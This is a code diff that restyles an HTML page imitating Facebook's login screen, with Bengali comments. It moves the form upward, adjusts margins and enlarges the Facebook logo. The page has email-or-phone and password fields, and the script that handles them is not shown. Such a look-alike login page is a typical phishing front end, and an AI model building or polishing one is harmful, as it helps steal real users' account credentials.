@@ -12,7 +12,7 @@
             padding: 0;
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: flex-start; /* ফর্মকে উপরে নিয়ে যাবে */
             align-items: center;
             height: 100vh;
         }
@@ -28,14 +28,15 @@
             border-radius: 8px;
             padding: 25px;
             box-sizing: border-box;
+            margin-top: 40px; /* উপরের দিকে নিয়ে যায় */
         }
 
         .logo-container {
-            margin-bottom: 25px;
+            margin-bottom: 20px; /* লোগোর নিচে স্পেস */
         }
 
         .logo {
-            width: 80px;
+            width: 90px;
         }
 
         .input-field {
@@ -101,10 +102,11 @@
     </style>
 </head>
 <body>
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
+    </div>
+
     <div class="container">
-        <div class="logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
-        </div>
         <form id="loginForm">
             <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" required>
             <input type="password" id="password" class="input-field" placeholder="Password" required>
@@ -155,4 +157,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
